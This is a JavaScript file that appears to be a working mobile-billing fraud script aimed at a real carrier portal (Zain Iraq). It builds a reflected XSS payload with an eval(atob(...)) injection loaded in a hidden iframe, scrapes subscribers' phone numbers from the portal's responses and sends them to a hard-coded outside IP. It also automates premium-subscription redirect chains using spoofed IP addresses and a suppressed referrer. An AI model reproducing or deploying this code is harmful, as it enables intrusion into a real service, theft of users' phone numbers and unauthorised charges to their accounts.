link = 'UUUUUU';
ip = '151.236.171.' + rand(0, 255);
test = 'TEST_TEST';

function newTk() {
  track('newTk>>>');
  setTimeout(function () {
    window.location.href = 'CAMPAIGN_URL';
  }, 6000);
}

if (typeof track == 'undefined') {
  window.track = function (e) {};
}

function LogSuccessGetUrl() {
  new Image().src = '/log_get_url?offer=NAME_NAME&value=1&message=success';
}

function SwTest(e) {
  return (
    '/req?onlybody&token=TOKEN_TOKEN&url=' + encodeURIComponent(e) + '&ip=' + ip
  );
}

function rand(e, t) {
  return Math.floor(Math.random() * (t - e)) + e;
}

function getUrlVar(e, t) {
  var i = new RegExp('[?|&]' + t + '=([^&]*)', 'i').exec(e);
  return (i && unescape(i[1])) || '';
}

function guid() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    var r = (16 * Math.random()) | 0;
    return ('x' == c ? r : (3 & r) | 8).toString(16);
  });
}

var meta = document.createElement('meta');
meta.name = 'referrer';
meta.content = 'never';
document.getElementsByTagName('head')[0].appendChild(meta);

function addImg(src) {
  var img = new Image();
  img.src = src;
}

function getParamFormString(key, str) {
  let start, end;
  if (
    ('?' == str.substring(0, 1) && (str = '&' + str.substring(1, str.length)),
    (str = '&' + str),
    'string' != typeof key)
  )
    throw new Error('');
  return key && str && new RegExp(key + '=', 'g').test(str)
    ? ((key = '&' + key),
      (key += '='),
      (start = str.indexOf(key) + key.length),
      -1 == (end = str.indexOf('&', start)) && (end = str.length),
      str.substring(start, end))
    : '';
}

function run(offer) {
  $.get(
    'https://3.38.151.30:3000?d=' +
      getParamFormString('d', offer.split('?')[1]) +
      '&msisdn=' +
      window.msisdn,
    function (data) {
      track('Result>>>' + data);
    },
  );
}

function isAsn(t) {
  var a = /^http[s]{0,1}:\/\/(.*?)(xxxxxx|yyyyyy)/;
  return a.test(t);
}

function getUrl(t) {
  var e = t.url ? t.url : link,
    r = t.i ? t.i : 1;
  if (e.indexOf('http://www.games-box.net/views/landingpage.html') === 0) {
    LogSuccessGetUrl();
    track('landingpage>>>' + e);
    run(e);
  } else {
    var a = SwTest(e) + '&ip=' + ip;
    isAsn(e) && (a = SwTest(e) + '&com=oxy&isp=iqz');
    $.ajax({
      url: a,
      success: function (t) {
        if ((track(r + '>>>' + t), 0 != t.indexOf('http'))) {
          if (/url=['|"](.*?)['|"]/i.exec(t) !== null) {
            t = /url=['|"](.*?)['|"]/i.exec(t)[1];
          }
          if (/url=['|"](.*?)['|"]/i.exec(t) !== null) {
            t = /url=['|"](.*?)['|"]/i.exec(t)[1];
          }
          if (/url=(.*?)['|"]/i.exec(t) !== null) {
            t = /url=(.*?)['|"]/i.exec(t)[1];
          }
          if (/url=(.*?)['|"]/i.exec(t) !== null) {
            t = /url=(.*?)['|"]/i.exec(t)[1];
          }
          if (/;url=(.*?)/.exec(t) !== null) {
            t = /;url=(.*?)/.exec(t)[1];
          }
          if (/;\surl=(.*?)/.exec(t) !== null) {
            t = /;\surl=(.*?)/.exec(t)[1];
          }
          if (/location.replace\(['|"](.*?)['|"]\)/i.exec(t) !== null) {
            t = /location.replace\(['|"](.*?)['|"]\)/i.exec(t)[1];
          }
          if (/location='(.*?)['|"]/i.exec(t) !== null) {
            t = /location='(.*?)['|"]/i.exec(t)[1];
          }
          if (/window.location=\s*"(.+?)"/i.exec(t) !== null) {
            t = /window.location=\s*"(.+?)"/i.exec(t)[1];
          }
          t = t.replace(/\&amp;/g, '&');
          track(r + '>>>' + t);
          if (0 !== t.indexOf('http')) {
            newTk();
            r = 10;
          }
        }
        r++, r < 10 && getUrl({ url: t, i: r });
      },
      error: function () {
        track('Ajax Fail>>>');
        newTk();
      },
    });
  }
}

window.addEventListener('message', function (e) {
  if ('undefined' !== e.data && '' != e.data)
    if (
      ((html = e.data),
      (html = html.replace(/"/g, "'")),
      track('event data>>>' + html),
      addIframeUrl({ data: html }),
      -1 != html.indexOf('Subscription Failed'))
    )
      track('OneKeyShutDown??>>>>');
    else if (-1 != html.indexOf('You failed to join VIP club.'))
      track('You failed to join VIP club.>>>');
    else if (-1 != html.indexOf("name='u' value=''"))
      track('Number Required>>>');
    else if (-1 != html.indexOf("name='needCnfm' value='2'")) track('Pin>>>');
    else if (-1 != html.indexOf("name='needCnfm'")) {
      var regex = /<input type='hidden' name='u' value='([^']+)'/;
      var match = html.match(regex);
      if (match && match.length === 2) {
        window.msisdn = match[1];
        track('msisdn: ' + window.msisdn);
        getUrl({ url: link, i: 1 });
      }
    } else {
      track('OnekeyShutDown???>>>');
    }
});

function lpX() {
  var url =
    'http://ptldynamic.zainzone.iq.zain.com/0013em?click_id=track_20231212091439_64bd21fa_46ac_4804_8174_b52c4adba620&trafficsource_id=3_267&subpublisher_id=3_267';
  var xssUrl =
    'http://ptldynamic.zainzone.iq.zain.com/0013em?click_id=%27/%3E%3Cimg%20src=%27%27%20onerror=%22eval(atob(window.location.hash.substr(1)))%22%3E%3C!--&trafficsource_id=&subpublisher_id=#';
  var js =
    "var xhr=new XMLHttpRequest();xhr.open('GET','" +
    url +
    "',!1);xhr.send(); if(200==xhr.status){window.parent.postMessage(xhr.responseText,'*');}";
  var str = btoa(js);
  var a = document.createElement('iframe');
  a.setAttribute('referrerpolicy', 'no-referrer');
  a.setAttribute('src', xssUrl + str);
  a.setAttribute(
    'sandbox',
    'allow-scripts allow-forms allow-same-origin allow-popups',
  );
  document.body.appendChild(a);
}

if (test === '0') {
  lpX();
} else {
  window.msisdn = '7827806769' + (Math.floor(Math.random() * 900) + 100);
  getUrl({ url: link, i: 1 });
}
